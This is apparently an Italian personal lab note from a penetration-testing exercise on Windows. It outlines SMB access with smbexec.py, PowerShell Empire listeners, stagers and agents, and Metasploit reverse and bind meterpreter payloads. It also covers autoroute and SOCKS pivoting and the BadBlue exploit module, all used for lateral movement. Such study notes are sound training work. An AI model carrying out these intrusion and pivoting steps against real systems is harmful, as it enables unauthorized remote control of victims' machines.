## Tags
1. Tecniche
	1. #exploit #postexploitation  #powersehell
2. Ambiente
	1.  #windows



## Processo
Passaggi logici seguiti.

1. Nmap port scan
2. Porta 445 aperta?
	1. smbexec.py '[nome]:[password]'  [ip]
3. Ping other system for lateral movement
4. Start powershell empire lato server
	1. powershell-empire server
5. Start powershell empire lato client
	1. powershell-empire client
	2.  uselistener http
		1. set Host [ip]
		2. set Port [port]
		3. execute
	3. tutto come metasploit per ora
	4. usestager [payload]
		1. set  Listener [Listener creato prima]
		2. execute
	5. agents
		1. Mostra le connessioni con il payload
	6. interact [name of the agent (vittima)]
		1. Ora hai accesso alla powershell della vittima
		2. Da qui si possono usare i moduli di powershell empire
6. Dentro la macchina della vittima con powershell empire
	1. usemodule powershell/situational awareness/network/portscan
		1. set host [ip]
7. msfconsole (per poi avere i moduli di metasploit per port forwarding) 
	1. usiamo il Web delivery module
	2. settare exploit 
	3. set payload windows/meterpreter/reverse_tcp
	4. Poi si ritorna su powershell empire per passare tutto a msfconsole
		1. usemodule /powershell/code_execution/invoke_metasploitpayload
		2. Passare URL msfconsole
		3. E poi siamo dentro
	5. Usare modulo autoroute 
		1. lo configuriamo 
		2. run
	6. use auxiliary/server/socks_proxy
		1. Cosicchè il modulo autoroute possa forwardare tutta la connessione al nostro browser
		2. Ovviamente configurare la proxy di firefox sul nostro ip e cambiare la porta che deve essere uguale a quella che abbiamo messo su questo modulo
	7. Una volta fatto tutto cio, vedere cosa c'è su questa porta 80 e exploitarla con badblue exploit module su msfconsole
		1. set PAYLOAD windows/meterpreter/bind_ tcp
			1. Perchè il target si mette all'ascolto per una nostra connessione
## Logica
Solo quelli eseguiti realmente.
1. fatto l'accesso tramite smb
2. start powershell empire server and client
3. creanto uno staged payload
4. inserito dentro la vittima tramite smb
5. una volta fatto cio siamo dentro la powershell e possiamo usare i moduli di powershell empire
6. Perferomato un portscan
7. Apriamo msfconsole per usare i suoi moduli di portfowrwarding
8. Tramite il modulo di empire trasferiamo tutta la connessione su msfconsole per i suoi moduli
9. usiamo i moduli msfconsole per avere accesso al secondo host


## Teoria

1. Powershell empire viene usato per
	1. usare un payload per connettersi alla powershell della macchina vittima
	2. Come metasploit si stabilisce una connessione permanente inserendo il payload, per poi fare lateral movement


## Errori
Errori fatti / blocchi.